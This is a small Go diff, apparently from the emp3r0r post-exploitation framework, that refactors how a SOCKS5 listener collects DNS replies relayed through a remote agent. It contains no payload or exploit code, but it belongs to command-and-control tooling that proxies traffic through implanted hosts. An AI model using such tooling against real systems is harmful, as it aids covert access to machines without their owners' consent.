@@ -220,12 +220,12 @@ func (ls *socks5Listener) relayDNSQuery(agent *def.Emp3r0rAgent, query []byte, d
 
 	select {
 	case <-resultCh:
-		rawAny, ok := live.CmdResults.LoadAndDelete(token)
+		rawStr, ok := live.TakeCmdResultString(token)
 		clearProxyJobBookkeeping(token)
 		if !ok {
 			return nil, fmt.Errorf("agent returned no payload")
 		}
-		raw := []byte(rawAny.(string))
+		raw := []byte(rawStr)
 		// The agent answers binary DNS replies on success and "Error: ..."
 		// text on malformed input / overload. Only forward a plausible DNS
 		// response back to the client: structurally a reply (QR set) echoing
